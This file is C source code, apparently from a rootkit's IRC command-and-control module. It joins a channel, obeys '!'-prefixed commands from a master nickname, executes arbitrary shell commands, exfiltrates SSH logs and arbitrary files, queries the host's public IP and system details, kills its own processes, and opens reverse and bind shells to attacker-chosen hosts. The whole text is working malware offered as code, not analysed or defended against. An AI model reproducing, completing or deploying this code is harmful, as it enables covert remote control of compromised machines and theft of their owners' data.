void do_command(int cmd, char *item){
    if(cmd == CMD_ADDR){
        do_shcmd("curl wtfismyip.com/text", MODE_RKCMD);
        return;
    }

    if(cmd == CMD_HELP){
        showhelp();
        return;
    }

    if(cmd == CMD_INFO){
        do_shcmd("uname -a", MODE_RKCMD);
        return;
    }

    if(cmd == CMD_KILL){
        if(kill_self() < 0)
            CMSG("COULDN'T KILL SELF.");
        return;
    }

    if(cmd == CMD_DISC){
        kill_rk_procs();
        return;
    }

    if(cmd == CMD_EXEC){
        char *cmdexec = get_last_argument(item);
        do_shcmd(cmdexec, MODE_USRCMD);
        free(cmdexec);
        return;
    }

    if(cmd == CMD_SSHL){
        if(sendfile(SSH_LOGS) < 0)
            CMSG("SOMETHING WENT WRONG READING SSH LOGS");
        return;
    }

    if(cmd == CMD_READ){
        char *file = get_argument(item, 4);
        if(sendfile(file) < 0)
            CMSG("SOMETHING WENT WRONG GETTING THAT PATH");
        free(file);
        return;
    }

    if(cmd == CMD_REVR){
        CMSG("SENDING SHELL TO GIVEN HOST & PORT.");

        char *host = get_argument(item, 4);
        if(host == NULL){
            CMSG("FAILED GETTING HOST.");
            return;
        }
        char *_port = get_argument(item, 5);
        int port = atoi(_port);
        free(_port);
        if(!port){
            CMSG("FAILED GETTING PORT.");
            free(host);
            return;
        }

        pid_t child = fork();
        if(child < 0){
            CMSG("COULDN'T FORK THE REVERSE SHELL PROCESS.");
            free(host);
            return;
        }
        
        if(child == 0)
            sendshell(host, port);

        signal(SIGCHLD, SIG_IGN);
        free(host);
        return;
    }

    if(cmd == CMD_BIND){
        CMSG("I WILL SEND BACK THE PORT NUMBER ON SUCCESS.");

        char *portarg = get_argument(item, 4);
        int port = atoi(portarg);
        if(!port){
            CMSG("SOMETHING WENT WRONG GETTING PORT NUMBER.");
            free(portarg);
            return;
        }

        if(create_bind_shell(port) < 0){
            CMSG("FAILED.");
        }else CMSG(portarg);
        free(portarg);
        return;
    }
}

void selcommand(const char *command, char *item, char *ucmd){
    if(strncmp(NICK, ucmd, strlen(ucmd)) && strncmp("ALL", ucmd, strlen(ucmd)))
        return;

    char *cmd = NULL;
    for(int i = 0; ircmds[i] != NULL; i++){         /* find command to be */
        cmd = ircmds[i];                            /* executed and do it */
        if(!strncmp(command, cmd, strlen(cmd)))
            do_command(i, item);
    }
}

void betrayer(int s){
    char line[LINE_MAX];       /* main buf          */
    char *username, *command,  /* & parts of buffer */
         *larg, *ucmd;
    int have_ponged = 0,
        inchannel = 0;

#ifndef WAIT_ON_PING
    have_ponged = 1;
#endif

    while(1){
        read_line(s, line);
        username = get_username(line);
        command = get_command(line);
        larg = get_last_argument(line);

        if(!strcmp(command, "PING")){
            send_pong(s, larg);

            if(!have_ponged)
                have_ponged = 1;
        }

        if(!have_ponged) continue;

        if(!inchannel){
            join_channel(s, CHANNEL);
            inchannel = 1;
            continue;
        }

        if(strlen(username) == 0)
            continue;

#ifdef MASTER_NICK
        /* only accept input from defined MASTER_NICK */
        if(strncmp(username, MASTER_NICK, strlen(username)))
            continue;
#endif

        ucmd = get_argument(line, 3);
        if(ucmd[0] != '\0' && !strncmp(larg, "!", 1)){  /* somebody has sent a command. establish      */
            selcommand(larg, line, ucmd);               /* which command it is & behave appropriately. */
            continue;
        }

        free(username);
        free(command);
        free(larg);
        free(ucmd);
    }
}